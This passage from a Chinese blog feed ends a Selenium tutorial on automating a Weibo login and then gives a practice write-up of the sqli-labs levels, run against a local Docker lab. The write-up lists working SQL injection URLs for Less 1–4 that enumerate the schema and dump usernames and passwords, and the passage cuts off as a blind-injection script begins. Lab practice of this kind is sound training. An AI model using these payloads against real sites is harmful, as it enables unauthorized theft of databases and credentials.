driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation:"></a>Explanation:</h3><p>这一步较简单，直接看注释就OK</p><h2 id="step4-关闭前面的界面，点击百度第一个结果，并滑动滚轮找到登录按钮点击"><a href="#step4-关闭前面的界面，点击百度第一个结果，并滑动滚轮找到登录按钮点击" class="headerlink" title="step4 关闭前面的界面，点击百度第一个结果，并滑动滚轮找到登录按钮点击"></a>step4 关闭前面的界面，点击百度第一个结果，并滑动滚轮找到登录按钮点击</h2><h3 id="Code：-1"><a href="#Code：-1" class="headerlink" title="Code："></a>Code：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles            <span class="hljs-comment">#获取当前所有界面句柄</span><br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:                   <span class="hljs-comment">#循环删除前面的页面</span><br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)  <span class="hljs-comment">#执行向下滚动动作</span><br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()   <span class="hljs-comment">#点击登录按钮</span><br>        time.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation-1"><a href="#Explanation-1" class="headerlink" title="Explanation:"></a>Explanation:</h3><p>首先关闭前面的句柄，并将新页面句柄设为当前句柄，否则xpath将寻找不到新页面的元素（在旧页面寻找）；然后执行滚动动作的目的是，刚进入页面时并未发现登录按钮（未加载），在滑动滚轮之后出现，于是模拟滚动效果并点击登录按钮。<br><a href="https://imgse.com/i/xk9LRI"><img src="https://s1.ax1x.com/2022/09/22/xk9LRI.png" alt="xk9LRI.png"></a><br>上图为滚动前，可以看出此时chrome已经检测出我们不是人为操作了。<br><a href="https://imgse.com/i/xk9qJA"><img src="https://s1.ax1x.com/2022/09/22/xk9qJA.png" alt="xk9qJA.png"></a><br>滚动后可以发现右上角出现登录按钮，点击它。</p><h2 id="step-5-点击账号登录，并关闭之前的页面"><a href="#step-5-点击账号登录，并关闭之前的页面" class="headerlink" title="step 5 点击账号登录，并关闭之前的页面"></a>step 5 点击账号登录，并关闭之前的页面</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()   <span class="hljs-comment">#点击账号登陆</span><br><br>        handles=driver.window_handles            <span class="hljs-comment">#关闭之前的界面</span><br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>) <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation-2"><a href="#Explanation-2" class="headerlink" title="Explanation:"></a>Explanation:</h3><p>这一步和上面的操作差不多，看注释就行，然后就跳转到新界面。<br><a href="https://imgse.com/i/xk97IH"><img src="https://s1.ax1x.com/2022/09/22/xk97IH.png" alt="xk97IH.png"></a></p><h2 id="step-6-输入账号密码，并点击登录"><a href="#step-6-输入账号密码，并点击登录" class="headerlink" title="step 6 输入账号密码，并点击登录"></a>step 6 输入账号密码，并点击登录</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click() <span class="hljs-comment">#点击账号输入框</span><br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>) <span class="hljs-comment">#输入账号</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click() <span class="hljs-comment">#点击密码输入框</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>) <span class="hljs-comment">#输入密码</span><br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()  <span class="hljs-comment">#点击登录</span><br>        time.sleep(<span class="hljs-number">5</span>) <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation-3"><a href="#Explanation-3" class="headerlink" title="Explanation:"></a>Explanation:</h3><p>先定位到账号输入框和密码输入框，然后敲入账号密码，点击登录即可。账号密码校验成功后跳转到验证页面：<br><a href="https://imgse.com/i/xk9bid"><img src="https://s1.ax1x.com/2022/09/22/xk9bid.png" alt="xk9bid.png"></a></p><h2 id="step-7-利用私信验证登录"><a href="#step-7-利用私信验证登录" class="headerlink" title="step 7 利用私信验证登录"></a>step 7 利用私信验证登录</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click()<br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;dmCheck&quot;]&#x27;</span>).click()  <span class="hljs-comment">#点击私信验证按钮</span><br>        time.sleep(<span class="hljs-number">1</span>)<br>        driver.find_element_by_id(<span class="hljs-string">&#x27;send_dm_btn&#x27;</span>).click()  <span class="hljs-comment">#点击发送私信</span><br>        <br>        <br>        <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br></code></pre></td></tr></table></figure><h3 id="Explanation-4"><a href="#Explanation-4" class="headerlink" title="Explanation:"></a>Explanation:</h3><p>点击私信验证按钮，跳转之后点击发送，然后在手机端微博的私信确认登录就完成登录了。<br><a href="https://imgse.com/i/xk9Tde"><img src="https://s1.ax1x.com/2022/09/22/xk9Tde.png" alt="xk9Tde.png"></a><br>校验通过，登陆成功。</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-lab</title>
    <link href="/2022/09/02/sqli-lab/"/>
    <url>/2022/09/02/sqli-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学了一段时间的web了，最近决定把几个靶场打一打，比如说sql注入，SSTI，XXE，XSS啥的。靶场的搭建采用docker直接pull的方式，简单又快捷，五分钟即可进入靶场，谁用谁知道。</p><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less 1"></a>less 1</h2><p>字符型注入，直接打:  </p><p>payload:  </p><ul><li>判断字符型注入:<br><a href="http://127.0.0.1/Less-1/?id=1%27%20and%201=1%23">http://127.0.0.1/Less-1/?id=1%27%20and%201=1%23</a> 正常回显<br><a href="http://127.0.0.1/Less-1/?id=1%27%20and%201=2%23">http://127.0.0.1/Less-1/?id=1%27%20and%201=2%23</a> 无回显<br>判断为字符型注入</li><li>判断字段数：<br><a href="http://127.0.0.1/Less-1/?id=1%27%20order%20by%203%23">http://127.0.0.1/Less-1/?id=1%27%20order%20by%203%23</a> 正常回显<br><a href="http://127.0.0.1/Less-1/?id=1%27%20order%20by%204%23">http://127.0.0.1/Less-1/?id=1%27%20order%20by%204%23</a> 报错：Unknown column ‘4’ in ‘order clause’<br>字段数为3</li><li>查库名：<br><a href="http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,database()%23">http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,database()%23</a><br>得到库名为security</li><li>查表名：<br><a href="http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23">http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</a><br>得到表名为emails,referers,uagents,users</li><li>查字段名：<br><a href="http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23">http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23</a><br>以表users为例，得到users表有三个字段：id,username,password</li><li>查字段值：<br><a href="http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23">http://127.0.0.1/Less-1/?id=-1%27%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23</a><br>同时查三个字段的所有数据<h2 id="less-2"><a href="#less-2" class="headerlink" title="less 2"></a>less 2</h2>数字型注入，也是直接打：</li></ul><p>payload:  </p><ul><li>判断数字型注入：<br><a href="http://127.0.0.1/Less-2/?id=1%20and%201=1">http://127.0.0.1/Less-2/?id=1%20and%201=1</a> 正常回显<br><a href="http://127.0.0.1/Less-2/?id=1%20and%201=2">http://127.0.0.1/Less-2/?id=1%20and%201=2</a> 无回显  </li><li>判断字段数：<br><a href="http://127.0.0.1/Less-2/?id=1%20order%20by%203">http://127.0.0.1/Less-2/?id=1%20order%20by%203</a> 正常回显<br><a href="http://127.0.0.1/Less-2/?id=1%20order%20by%204">http://127.0.0.1/Less-2/?id=1%20order%20by%204</a> 报错：Unknown column ‘4’ in ‘order clause’<br>字段数为3</li><li>查库名：<br><a href="http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,database(">http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,database(</a>)<br>得到库名为security  </li><li>查表名：<br><a href="http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database(">http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database(</a>)<br>得到表名为emails,referers,uagents,users  </li><li>查字段名：<br><a href="http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27">http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27</a><br>以表users为例，得到users表有三个字段：id,username,password  </li><li><p>查字段值：<br><a href="http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(id,username,password)%20from%20users">http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(id,username,password)%20from%20users</a><br>同时查三个字段的所有数据  </p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less 3"></a>less 3</h2><p>变形的字符型注入，根据报错信息可以得到id被(‘’)包起来了，因此只需要将less 1的1’改为1’)即可<br>payload:  </p></li><li><p>判断字符型注入<br><a href="http://127.0.0.1/Less-3/?id=1%27)%20and%201=1%23">http://127.0.0.1/Less-3/?id=1%27)%20and%201=1%23</a> 正常回显<br><a href="http://127.0.0.1/Less-3/?id=1%27)%20and%201=2%23">http://127.0.0.1/Less-3/?id=1%27)%20and%201=2%23</a> 无回显  </p></li><li>判断字段数<br><a href="http://127.0.0.1/Less-3/?id=1%27)%20order%20by%203%23">http://127.0.0.1/Less-3/?id=1%27)%20order%20by%203%23</a>  正常回显<br><a href="http://127.0.0.1/Less-3/?id=1%27)%20order%20by%204%23">http://127.0.0.1/Less-3/?id=1%27)%20order%20by%204%23</a>  报错：Unknown column ‘4’ in ‘order clause’<br>字段数为3  </li><li>查库名<br><a href="http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,database()%23">http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,database()%23</a><br>得到库名为security </li><li>查表名<br><a href="http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23">http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</a><br>得到表名为：emails,referers,uagents,users  </li><li>查字段名：<br><a href="http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23">http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23</a><br>以表users为例，得到users表有三个字段：id,username,password  </li><li><p>查字段值：<br><a href="http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23">http://127.0.0.1/Less-3/?id=-1%27)%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23</a><br>同时查三个字段的所有数据</p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less 4"></a>less 4</h2><p>双引号闭合加上括号的变种<br>payload:  </p></li><li><p>判断字符型注入<br><a href="http://127.0.0.1/Less-4/?id=1%22)%20and%201=1%23">http://127.0.0.1/Less-4/?id=1%22)%20and%201=1%23</a>  正常回显<br><a href="http://127.0.0.1/Less-4/?id=1%22)%20and%201=2%23">http://127.0.0.1/Less-4/?id=1%22)%20and%201=2%23</a>  无回显  </p></li><li>判断字段数<br><a href="http://127.0.0.1/Less-4/?id=1%22)%20%20order%20by%203%23">http://127.0.0.1/Less-4/?id=1%22)%20%20order%20by%203%23</a> 正常回显<br><a href="http://127.0.0.1/Less-4/?id=1%22)%20%20order%20by%204%23">http://127.0.0.1/Less-4/?id=1%22)%20%20order%20by%204%23</a> 报错：Unknown column ‘4’ in ‘order clause’<br>字段数为3  </li><li>查库名<br><a href="http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,database()%23">http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,database()%23</a><br>得到库名为security  </li><li>查表名<br><a href="http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23">http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</a><br>得到表名为：emails,referers,uagents,users  </li><li>查字段名<br><a href="http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23">http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%23</a><br>以表users为例，得到users表有三个字段：id,username,password  </li><li>查字段值<br><a href="http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23">http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(id,username,password)%20from%20users%23</a><br>同时查三个字段的所有数据  <h2 id="less-5"><a href="#less-5" class="headerlink" title="less 5"></a>less 5</h2>盲注，注入过程如下:  </li></ul><p>payload:  </p><ul><li>判断盲注<br><a href="http://127.0.0.1/Less-5/?id=1%27%20and%201=1%23">http://127.0.0.1/Less-5/?id=1%27%20and%201=1%23</a> 回显You are in<br><a href="http://127.0.0.1/Less-5/?id=1%27%20and%201=2%23">http://127.0.0.1/Less-5/?id=1%27%20and%201=2%23</a> 无回显<br>判断为盲注<br>爆库名长度、爆库名、爆表名长度、爆表名、爆字段长度、爆字段、爆数据长度、爆数据，脚本如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 